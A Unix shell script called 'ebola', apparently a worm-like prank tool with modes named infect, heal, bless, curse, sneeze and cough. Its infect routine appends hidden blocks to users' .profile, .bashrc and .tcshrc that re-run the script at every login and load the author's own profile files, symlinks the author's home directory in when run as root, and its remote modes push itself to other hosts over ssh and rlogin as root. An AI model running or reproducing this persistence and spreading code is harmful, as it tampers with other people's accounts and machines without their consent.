#!/bin/sh

# Needed variables
HEALED=0
HEALING=0
HEALED_MSG="Your mana is dangerously low"
INFECTED=0
INFECTED_MSG="All your base are belong to us"
INFECTING=0
BLESSED=0
BLESSED_TAG="##You are blessed##"
BLESSED_MSG="This child is blessed"
BLESSING=0
CURSED=0
CURSING=0
COUGHING=0
SNEEZING=0

ID=`id | cut -d\( -f2 | cut -d\) -f1`
GETID="\`id | cut -d\( -f2 | cut -d\) -f1\`"
MYID="per47214c"

PROFILE_KSH="$HOME/.profile"
PROFILE_BASH="$HOME/.bashrc"
PROFILE_TCSH="$HOME/.tcshrc"
MYHOME="/net/pacific/vol/vol1/home/${MYID}"
SCRIPTS="${MYHOME}/.scripts"
MSG="/tmp/ebola.$$"
REMOTE=""

#-------------------------------------
# curseShell
#-------------------------------------
curseShell()
{
 	POS=`awk -F'\n' 'BEGIN { pos=-1 } $1 ~ /##You are blessed##/ { if (pos == -1) pos=NR } END { printf("%s", pos) }' ${1}`
	if [ ${POS} != "-1" ]; then
		SED_CMD="${POS}d"
		sed -e ${SED_CMD} ${1} > ${1}_$$
		rm -rf ${1} && mv ${1}_$$ ${1}
		CURSED=1
	fi
}

#------------------------------------------------
# doCurse()
#------------------------------------------------
doCurse()
{
	## Change profiles
	# Bourne/Korn Profile
	if [ -f ${PROFILE_KSH} -a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_KSH}` -gt 0 ]; then
		curseShell ${PROFILE_KSH}
	fi

        # Bash Profile
	if [ -f ${PROFILE_BASH} -a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_BASH}` -gt 0 ]; then
		curseShell ${PROFILE_BASH}
	fi

        # Extended C Shell Profile
	if [ -f ${PROFILE_TCSH} -a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_TCSH}` -gt 0 ]; then
		curseShell ${PROFILE_TCSH}
	fi
}

#------------------------------------------------
# doBless()
#------------------------------------------------
doBless()
{
 	if [ `grep -c "^${BLESSED_TAG}\$" ${PROFILE_KSH}` -gt 0 -o `grep -c "^${BLESSED_TAG}\$" ${PROFILE_BASH}` -gt 0 \
		-o `grep -c "^${BLESSED_TAG}\$" ${PROFILE_TCSH}` -gt 0 ]; then
			BLESSED=1
	else
			#
                ## Change profiles
		# Bourne/Korn Profile
		if [ -f ${PROFILE_KSH} ]; then
			echo ${BLESSED_TAG} >> ${PROFILE_KSH}
				BLESSED=1
			fi
	
                # Bash Profile
		if [ -f ${PROFILE_BASH} ]; then
			echo ${BLESSED_TAG} >> ${PROFILE_BASH}
				BLESSED=1
		fi

                # Extended C Shell Profile
		if [ -f ${PROFILE_TCSH} ]; then
				echo ${BLESSED_TAG} >> ${PROFILE_TCSH}
			BLESSED=1
		fi
	fi
}


#--------------------------------------------------
# doSneeze
#--------------------------------------------------
doSneeze()
{
 	${SCRIPTS}/ebola --infect ${REMOTE} > ${MSG}
	sleep 2
	if [ `grep -c 'All your base are belong to us' ${MSG}` -gt 0 ]; then INFECTED=1 ; fi
	if [ `grep -c 'This child is blessed' ${MSG}` -gt 0 ]; then BLESSED=1 ; fi
	trap "rm -rf ${MSG}; exit" EXIT HUP INT TERM

	if [ ${BLESSED} -ne 0 ]; then echo "This child is blessed\n" ; fi
	if [ ${INFECTED} -ne 0 ]; then
		rlogin -l root ${REMOTE}
	fi
}

#--------------------------------------------------
# doCough
#--------------------------------------------------
doCough()
{
 	if [ ${REMOTE} ]; then
		doSneeze && ${SCRIPTS}/ebola --heal ${REMOTE} > /dev/null
	else
            	${SCRIPTS}/ebola --infect > ${MSG}
		if [ `grep -c 'All your base are belong to us' ${MSG}` -gt 0 ]; then INFECTED=1 ; fi
		if [ `grep -c 'This child is blessed' ${MSG}` -gt 0 ]; then BLESSED=1 ; fi
		trap "rm -rf ${MSG}; exit" EXIT HUP INT TERM

		if [ ${BLESSED} -eq 0 -a ${INFECTED} -ne 0 ]; then
			bash && \
			${SCRIPTS}/ebola --heal && \
			exit
		fi
	fi
}

#-------------------------------------
# healShell
#-------------------------------------
healShell()
{
 	POS=`awk 'BEGIN { pos1=-1; pos2=-2 } \
		$1 ~ /AFP/ { if (pos1 == -1) pos1=NR; else pos2=NR } END { printf("%s:%s", pos1, pos2) }' ${1}`
	if [ ${POS} != "-1:-2" ]; then
		SED_CMD="`echo ${POS} | cut -d':' -f1`,`echo ${POS} | cut -d':' -f2`d"
		sed -e ${SED_CMD} ${1} > ${1}_$$
		rm -rf ${1} && mv ${1}_$$ ${1}
		HEALED=1
	fi
}


#--------------------------------------
# doHeal
#--------------------------------------
doHeal()
{
	## Change profiles
	healShell ${PROFILE_KSH} # Fix the Korn Shell
	healShell ${PROFILE_BASH} # Fix the Bash Shell
	healShell ${PROFILE_TCSH} # Fix the C Shell

	## Remove personal folder
	if [ -h $HOME/.${MYID} ]; then
		rm -rf $HOME/.${MYID}
		HEALED=1
	fi
}

#--------------------------------------
# doInfect
#--------------------------------------
doInfect()
{
	# Determine if machine is blessed
	if [ -f ${PROFILE_KSH} ]; then
		if [ `grep -c "^${BLESSED_TAG}\$" ${PROFILE_KSH}` -gt 0 ]; then BLESSED=1; fi
	fi
	if [ -f ${PROFILE_BASH} ]; then
		if [ `grep -c "^${BLESSED_TAG}\$" ${PROFILE_BASH}` -gt 0 ]; then BLESSED=1; fi
	fi
	if [ -f ${PROFILE_TCSH} ]; then
		if [ `grep -c "^${BLESSED_TAG}\$" ${PROFILE_TCSH}` -gt 0 ]; then BLESSED=1; fi
	fi
	
	#if [ `grep -c "^${BLESSED_TAG}\$" ${PROFILE_KSH}` -le 0 -a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_BASH}` -le 0 \
		#-a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_TCSH}` -le 0 ]; then

	if [ ${BLESSED} -eq 0 ]; then
		## Add personal folder
		if [ ${ID} = "root" ]; then
			if [ $HOME != "/home/${MYID}" -a ! -h "$HOME/.${MYID}" -a -d ${MYHOME} ]; then
				ln -s ${MYHOME} $HOME/.${MYID}
				INFECTED=1
			fi
		fi

		## Change profiles
		# Bourne/Korn Profile
		if [ ! -f ${PROFILE_KSH} ]; then
			echo "#echo ~/.profile" > ${PROFILE_KSH}
			echo "" >> ${PROFILE_KSH}
		fi
		if [ `grep -c ${MYID} ${PROFILE_KSH}` -le 0 ]; then
			echo "##############################AFP" >> ${PROFILE_KSH} 
			echo "# Keep the infection going" >> ${PROFILE_KSH} 
			echo "[ -d \"${MYHOME}\" ] && sh ${SCRIPTS}/ebola --infect" >> ${PROFILE_KSH} 
			echo "" >> ${PROFILE_KSH} 
			echo "# Add that personal touch" >> ${PROFILE_KSH} 
			echo "ID=${GETID}" >> ${PROFILE_KSH} 
			echo "if [ \${ID} != \"root\" ]; then" >> ${PROFILE_KSH} 
			echo "	[ \${HOST} != \"amber\" ] && . \$HOME/.profile_\${ID}" >> ${PROFILE_KSH} 
			echo "else" >> ${PROFILE_KSH} 
			echo "    	# Add your own line after this" >> ${PROFILE_KSH} 
			echo "    	. ${MYHOME}/.profile_per47214c" >> ${PROFILE_KSH} 
			echo "fi" >> ${PROFILE_KSH} 
			echo "##AFP" >> ${PROFILE_KSH} 

			#echo "Infected the Korn Shell"
			INFECTED=1
		fi

		# Bash Profile
		if [ ! -f ${PROFILE_BASH} ]; then
			echo "#echo \".bashrc ...\"" > ${PROFILE_BASH}
			echo "" >> ${PROFILE_BASH}
		fi
		if [ `grep -c ${MYID} ${PROFILE_BASH}` -le 0 ]; then
			echo "##############################AFP" >> ${PROFILE_BASH} 
			echo "# Keep the infection going" >> ${PROFILE_BASH} 
			echo "[ -d \"${MYHOME}\" ] && sh ${SCRIPTS}/ebola --infect" >> ${PROFILE_BASH} 
			echo "" >> ${PROFILE_BASH} 
			echo "# Add that personal touch" >> ${PROFILE_BASH} 
			echo "ID=${GETID}" >> ${PROFILE_BASH} 
			echo "[ \${ID} != \"root\" ] && . ~/.bashrc_\${ID} || . ${MYHOME}/.bashrc_per47214c" >> ${PROFILE_BASH} 
			echo "##AFP" >> ${PROFILE_BASH} 

			#echo "Infected the Bash Shell"
			INFECTED=1
		fi

		# Extended C Shell Profile
		if [ ! -f ${PROFILE_TCSH} ]; then
			echo "#!/bin/tcsh" > ${PROFILE_TCSH}
			echo "" >> ${PROFILE_TCSH}
		fi
		if [ `grep -c ${MYID} ${PROFILE_TCSH}` -le 0 ]; then
			echo "##############################AFP" >> ${PROFILE_TCSH} 
			echo "# Keep the infection going" >> ${PROFILE_TCSH} 
			echo "if ( -d \"${MYHOME}\" ) then" >> ${PROFILE_TCSH} 
			echo "	sh ${SCRIPTS}/ebola --infect" >> ${PROFILE_TCSH} 
			echo "endif" >> ${PROFILE_TCSH} 
			echo "" >> ${PROFILE_TCSH} 
			echo "# Add that personal touch" >> ${PROFILE_TCSH} 
			echo "set ID=${GETID}" >> ${PROFILE_TCSH} 
			echo "if ( \${ID} != \"root\" ) then" >> ${PROFILE_TCSH} 
			echo "	 source .tcshrc_\${ID}" >> ${PROFILE_TCSH} 
			echo "else" >> ${PROFILE_TCSH} 
			echo "    	# Add your own line after this" >> ${PROFILE_TCSH} 
			echo "    	source ${MYHOME}/.tcshrc_per47214c" >> ${PROFILE_TCSH} 
			echo "endif" >> ${PROFILE_TCSH} 
			echo "##AFP" >> ${PROFILE_TCSH} 

			#echo "Infected the Extended C Shell"
			INFECTED=1
		fi
	fi
}

#--------------------------------------
# doRemote
#--------------------------------------
doRemote()
{
	if [ ${INFECTING} -ne 0 ]; then
		ssh -f root@${REMOTE} ${SCRIPTS}/ebola --infect > ${MSG}
	elif [ ${HEALING} -ne 0 ]; then 
		ssh -f root@${REMOTE} ${SCRIPTS}/ebola --heal > ${MSG}
	elif [ ${BLESSING} -ne 0 ]; then
		ssh -f root@${REMOTE} ${SCRIPTS}/ebola --bless > ${MSG}
	elif [ ${CURSING} -ne 0 ]; then
		ssh -f root@${REMOTE} ${SCRIPTS}/ebola --curse > ${MSG}
	fi
	sleep 2

	if [ `grep -c 'You are likely to be eaten by a Grue' ${MSG}` -gt 0 ]; then CURSED=1 ; fi
	if [ `grep -c 'Your mana is dangerously low' ${MSG}` -gt 0 ]; then HEALED=1 ; fi
	if [ `grep -c 'All your base are belong to us' ${MSG}` -gt 0 ]; then INFECTED=1 ; fi
	if [ `grep -c 'This child is blessed' ${MSG}` -gt 0 ]; then BLESSED=1 ; fi
	trap "rm -rf ${MSG}; exit" EXIT HUP INT TERM
}

#################################################################
while [ $# -gt 0 ]; do
	case $1 in
	--infect) INFECTING=1 ;;
	--heal) HEALING=1 ;;
	--sneeze) SNEEZING=1 ;;
	--cough) COUGHING=1 ;;
	--bless) BLESSING=1 ;;
	--curse) CURSING=1 ;;
	*) REMOTE=$1 ;;
	esac	

	if [ $# -gt 0 ]; then shift 1 ; fi
done

if [ ${REMOTE} ]; then
	if [ ${COUGHING} -ne 0 ]; then doCough
	elif [ ${SNEEZING} -ne 0 ]; then doSneeze
	else doRemote ; fi
elif [ ${INFECTING} -ne 0 ]; then
	#if [ `grep -c "^${BLESSED_TAG}\$" ${PROFILE_KSH}` -le 0 -a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_BASH}` -le 0 \
	#	-a `grep -c "^${BLESSED_TAG}\$" ${PROFILE_TCSH}` -le 0 ]; then
		doInfect
	#else
	#	BLESSED=1
	#fi
elif [ ${HEALING} -ne 0 ]; then
	doHeal
elif [ ${BLESSING} -ne 0 -o ${CURSING} -ne 0 ]; then
	if [ `grep -c "AFP\$" ${PROFILE_KSH}` -gt 0 -o `grep -c "AFP\$" ${PROFILE_BASH}` -gt 0 \
                                                    -o `grep -c "AFP\$" ${PROFILE_TCSH}` -gt 0 ]; then
		INFECTED=1
	elif [ ${CURSING} -eq 0 ]; then
		doBless
	else
            	doCurse
	fi
elif [ ${COUGHING} -ne 0 ]; then
	doCough
fi

if [ ${HEALED} -ne 0 ]; then echo "${HEALED_MSG}\n" ; fi
if [ ${BLESSED} -ne 0 ]; then echo "${BLESSED_MSG}\n" ; fi
if [ ${CURSED} -ne 0 ]; then echo "You are likely to be eaten by a Grue\n" ; fi
if [ \( ${BLESSING} -ne 0 -o ${CURSING} -ne 0 \) -a ${INFECTED} -ne 0 ]; then 
	echo "A scourge is upon this being\n" 
elif [ ${INFECTED} -ne 0 ]; then 
	echo "${INFECTED_MSG}\n" 
fi
